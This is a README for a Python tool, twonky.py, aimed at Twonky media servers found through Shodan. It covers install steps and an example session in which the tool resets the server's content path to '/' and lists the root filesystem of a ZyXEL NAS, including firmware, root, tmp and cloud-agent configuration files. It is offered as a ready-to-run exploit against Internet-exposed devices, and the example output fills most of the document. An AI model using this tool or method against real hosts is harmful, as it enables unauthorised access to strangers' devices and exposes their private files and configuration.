# sharingIsCaring
Install:
Grab .git repository:
```
$ git clone https://github.com/mechanico/sharingIsCaring.git
```
Move into folder:
```
$ cd sharingIsCaring
```
Install dependicies:
```
$ sudo pip install -r requirements.txt
```
You're ready to go!

Usage: 

```
$ twonky.py [IP Adress] [port]
```

Example Usage:

```
$ python twonky.py XXX.XXX.XXX.XXX 9443
https://www.shodan.io/host/XXX.XXX.XXX.XXX
*** Port 9443 opened ***
Run Twonky browser on port 9443 [Y, N]? [Y]
*** Get Serverdetails from Twonky ***
Server Name: XXX
Serverplatform: arm_marvell_gnueabihf__zyxel-NAS-326-arm-marvell-gnueabihf-oem
Pictures shared: 0
Videos shared: 0
Pictures shared: 0
Videos shared: 0
Twonky Version: 8.3-19
Build date: 12/12/2016 (mm/dd/yyyy)
*** 'contentbase' path set to '/'' ***
path nr:
------------------------------
001 Dir /
002 Dir /e-data
003 Dir /firmware
004 Dir /home
005 Dir /i-data
006 Fil /init
007 Fil /linuxrc
008 Dir /mnt
009 Dir /ram_bin
010 Dir /root
011 Dir /tmp
012 Dir /usr
013 Dir /var
------------------------------
path nr: 002
------------------------------
------------------------------
path nr: 011
------------------------------
001 Fil DavLock
002 Fil ediskmap.map
003 Fil fileye
[...]
023 Fil zyfw_dl.filetype
024 Fil zyfw_dl.progress
025 Fil zyfw_dl_errno
026 Fil zylog_fifo1
027 Fil zylog_fifo2
028 Fil zylog_fifo3
029 Fil zylog_fifo4
030 Fil zypkglist_download.progress
031 Fil zyxel_cloud_agent_cert.conf
032 Fil zyxel_cloud_agent_configure.conf
------------------------------
path nr: 011/004
------------------------------
001 Fil fwlog
------------------------------
path nr: exit
```
